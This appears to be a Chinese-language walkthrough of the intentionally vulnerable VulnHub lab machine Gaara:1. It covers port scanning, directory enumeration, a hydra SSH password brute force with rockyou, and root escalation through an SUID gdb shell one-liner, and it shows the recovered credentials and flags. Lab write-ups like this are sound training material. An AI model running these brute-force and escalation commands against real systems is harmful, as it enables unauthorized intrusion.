# Gaara: 1

2024-5-21 https://www.vulnhub.com/entry/gaara-1,629/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
|   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
|_  256 b751f2f9855766a865542e05f940d2f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gaara
```

80 web 首页是张图片，源码也没发现什么信息。使用 gobuster 进行目录扫描：

```
gobuster dir -t 64 -u http://192.168.5.30/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.30/Cryoserver
```

http://192.168.5.30/Cryoserver 查看源码在最底部发下几个目录：

```
/Temari
/Kazekage
/iamGaara
```

挨个访问下，看看有什么，都是一串文字，再次使用 gobuster 对 3 个目录进行子目录扫描，什么都没扫出来。

http://192.168.5.30/iamGaara 中有一串字符串：f1MgN9mTf9SNbzRygcU，经过识别，发现是 base58 编码的，解码后为 gaara:ismyname

看上去像是 ssh 的用户和密码，尝试进行登陆，但是提示密码不对。看样子是用户对，密码还需要更大的字典去爆破，尝试使用 hydra + rockyou 进行爆破:

```
hydra -t 20 -l gaara -P ~/tools/dict/rockyou.txt ssh://192.168.5.30

[22][ssh] host: 192.168.5.30   login: gaara   password: iloveyou2
```

得到用户 ssh 凭据 gaara:iloveyou2，登陆 ssh 后，在 home 目录得到 flag：

```
gaara@Gaara:~$ ls -al
total 36
drwxr-xr-x 3 gaara gaara 4096 Dec 13  2020 .
drwxr-xr-x 3 root  root  4096 Dec 13  2020 ..
lrwxrwxrwx 1 root  root     9 Dec 13  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gaara gaara  220 Dec 13  2020 .bash_logout
-rw-r--r-- 1 gaara gaara 3526 Dec 13  2020 .bashrc
-rw-r--r-- 1 gaara gaara   33 Dec 13  2020 flag.txt
-rw-r--r-- 1 gaara gaara   57 Dec 13  2020 Kazekage.txt
drwxr-xr-x 3 gaara gaara 4096 Dec 13  2020 .local
-rw-r--r-- 1 gaara gaara  807 Dec 13  2020 .profile
-rw------- 1 gaara gaara  102 Dec 13  2020 .Xauthority
gaara@Gaara:~$ cat flag.txt
5451d3eb27acb16c652277d30945ab1e
```

同时看到另外一个文件 Kazekage.txt：

```
gaara@Gaara:~$ cat Kazekage.txt
You can find Kazekage here....

L3Vzci9sb2NhbC9nYW1lcw==
```

得到提示 /usr/local/games，看看这个目录有什么。

```
gaara@Gaara:/usr/local/games$ cat .supersecret.txt

Godaime Kazekage:

+++++ +++[- >++++ ++++< ]>+++ +.<++ ++++[ ->+++ +++<] >+.-- ---.< +++++
+++[- >---- ----< ]>--- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +++++ .<+++
[->-- -<]>- .++++ ++.<+ +++++ +++[- >---- ----- <]>-- --.<+ +++++ +++[-
>++++ +++++ <]>+. <+++[ ->--- <]>-- --.-- --.<+ ++[-> +++<] >++.. <+++[
->+++ <]>++ ++.<+ +++++ +++[- >---- ----- <]>-- ----- -.<++ +++++ ++[->
+++++ ++++< ]>+++ .<+++ [->-- -<]>- --.+. +++++ .---. <++++ ++++[ ->---
----- <]>-- ----- ----. <++++ +++++ [->++ +++++ ++<]> +++++ +++.< +++[-
>---< ]>-.+ +++++ .<+++ +++++ +[->- ----- ---<] >---- .<+++ +++++ [->++
+++++ +<]>+ ++.<+ ++[-> +++<] >+++. +++++ +.--- ----- -.--- ----- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++
+++.< +++[- >---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ ++[->
+++++ ++++< ]>++. ----. --.-- ----- -.<++ +[->+ ++<]> +++++ +.<++ +[->-
--<]> ---.+ .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- ----- .<+++
+++++ +[->+ +++++ +++<] >+++. <+++[ ->--- <]>-- -.--- ----. <++++ [->++
++<]> +++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ ++[-> +++++ +++<]
>++++ +.--- -.<++ ++[-> ++++< ]>++. <+++[ ->--- <]>-. +++.< +++[- >+++<
]>+++ +.<++ +++++ [->-- ----- <]>-- ----- --.<+ ++++[ ->--- --<]> -----
-.<++ +++++ [->++ +++++ <]>++ +.<++ +++[- >++++ +<]>+ ++++. +++++ ++.<+
+++++ +++[- >---- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >++++ .<+++
++[-> +++++ <]>.< ++++[ ->+++ +<]>+ .<+++ [->-- -<]>- ----. +.<++ +[->+
++<]> ++++. <++++ +++++ [->-- ----- --<]> .<
```

像是个 Brainfuck 码，看看解密得到什么 http://www.hiencode.com/brain.html ：

```
Did you really think you could find something that easily? Try Harder!
```

fuck 是个坑。

继续按常规思路寻找提权路径，suid 发现有 gdb，可以升级到 root 权限：

```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

最终得到 root 权限：

```
# id
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
# cd /root
# ls
root.txt
# cat root.txt


 ██████╗  █████╗  █████╗ ██████╗  █████╗
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║  ███╗███████║███████║██████╔╝███████║
██║   ██║██╔══██║██╔══██║██╔══██╗██╔══██║
╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

8a763d61f71db8e7aa237055de928d86

Congrats You have Rooted Gaara.

Give the feedback on Twitter if you Root this : @0xJin
```
